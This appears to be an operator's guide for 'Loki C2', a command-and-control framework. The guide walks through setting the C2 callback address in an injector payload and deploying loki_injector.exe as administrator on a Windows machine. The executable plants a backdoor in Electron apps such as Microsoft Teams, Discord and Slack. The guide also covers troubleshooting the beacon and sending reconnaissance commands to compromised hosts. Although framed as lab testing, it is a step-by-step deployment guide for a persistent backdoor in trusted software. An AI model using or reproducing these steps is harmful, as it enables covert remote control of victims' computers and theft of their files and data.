# 🔍 Loki C2 - Lab Monitoring Guide

## ✅ Loki Client GUI is Running!

The Loki C2 Electron client has been started and should be visible on your screen.

═══════════════════════════════════════════════════════════════

## 📊 Using the Dashboard

### 1. Dashboard View
   - Shows all connected agents
   - Real-time agent status
   - System information for each compromised machine

### 2. Agent Details
   - Click on an agent to see details
   - View: Hostname, Username, IP addresses, OS info
   - Task queue and execution history

### 3. Task Queue
   - Monitor command execution
   - See payload injection status
   - Real-time feedback from agents

### 4. Explorer
   - Browse files on compromised systems
   - Download/upload capabilities

═══════════════════════════════════════════════════════════════

## 🧪 Testing Your .exe in Lab Environment

### Step 1: Configure C2 Server in Payload

Before deploying loki_injector.exe, update the C2 server URL:

**Edit:** `payloads/output/windows/loki_injector.py` (line ~30)

```javascript
const cfg = {
    srv: 'http://YOUR_MAC_IP:3000',  // ← Change this!
    int: 60000,
    id: `${os.hostname()}_${os.userInfo().username}`
};
```

**Find your Mac's IP:**
```bash
ifconfig | grep "inet " | grep -v 127.0.0.1
```

### Step 2: Rebuild .exe (if you changed C2 URL)

If you updated the C2 server URL:
- Push changes to GitHub
- Go to Actions → Run workflow
- Download new loki_injector.exe

### Step 3: Deploy to Lab Windows Machine

```bash
# Transfer .exe to your Windows lab
scp payloads/output/windows/dist/loki_injector.exe admin@lab-windows:C:\Temp\
```

### Step 4: Execute on Windows Lab

On your Windows lab machine:
1. Right-click `loki_injector.exe`
2. Select **"Run as Administrator"**
3. Wait for injection to complete

### Step 5: Monitor in Loki Client

Watch the Loki C2 dashboard for:
- ✅ New agent connection
- ✅ Beacon messages
- ✅ System information
- ✅ Task execution

═══════════════════════════════════════════════════════════════

## 📡 Expected Flow

### 1. Injection Phase (loki_injector.exe)
```
[*] Scanning for Electron applications...
[+] Found: Microsoft Teams
[*] Injecting backdoor...
[+] Injection successful!
```

### 2. Backdoor Activation (Restart Teams)
```
User restarts Microsoft Teams
→ Backdoor loads with Teams
→ Beacon sent to C2 server
```

### 3. C2 Connection (Loki Dashboard)
```
Dashboard shows:
- New agent appears
- Hostname: LAB-WIN-01
- User: test_user
- App: Microsoft Teams
- Status: ✅ Connected
```

### 4. Command & Control
```
Select agent → Send commands:
- whoami
- hostname
- ipconfig
- dir C:\
```

═══════════════════════════════════════════════════════════════

## 🔧 Troubleshooting

### No Agent Connection?

**Check 1: C2 Server URL**
```bash
# In loki_injector.py, should be:
srv: 'http://YOUR_MAC_IP:3000'

# NOT localhost! Windows can't reach "localhost" on your Mac
```

**Check 2: Firewall**
```bash
# Allow port 3000 on macOS firewall
# System Settings → Network → Firewall
```

**Check 3: Payload Injected?**
```
On Windows:
- Open Teams
- Press F12 (DevTools)
- Console tab
- Look for [Loki] messages
```

**Check 4: Network Connectivity**
```bash
# On Windows lab, test connection:
curl http://YOUR_MAC_IP:3000
# Should return Loki C2 response
```

### Injection Failed?

**Check 1: Target App Installed**
```
Verify Microsoft Teams, Discord, or Slack installed
```

**Check 2: ASAR Backup Exists?**
```
Look for app.asar.backup file
Means injection was attempted
```

**Check 3: Run as Administrator**
```
Right-click → Run as Administrator
Required for file modifications
```

═══════════════════════════════════════════════════════════════

## 📝 Monitoring Checklist

Before executing .exe:
- [ ] Loki C2 client running (this window)
- [ ] C2 server URL configured correctly
- [ ] Firewall allows port 3000
- [ ] Windows lab machine accessible
- [ ] Target app (Teams/Discord/Slack) installed

During execution:
- [ ] Watch for agent beacon in dashboard
- [ ] Check console for [Loki] messages (F12)
- [ ] Verify injection success messages
- [ ] Restart injected application

After connection:
- [ ] Agent shows in dashboard
- [ ] System info populated
- [ ] Commands execute successfully
- [ ] Task queue working

═══════════════════════════════════════════════════════════════

## 🎯 Testing Commands

Once agent connects, test with:

```
whoami           - Current user
hostname         - Computer name
ipconfig         - Network info
dir C:\Users\    - Browse files
tasklist         - Running processes
systeminfo       - Full system info
```

═══════════════════════════════════════════════════════════════

## ✅ You're Ready!

The Loki C2 dashboard is now monitoring for connections.

Execute loki_injector.exe on your Windows lab and watch
the magic happen! 🚀

═══════════════════════════════════════════════════════════════
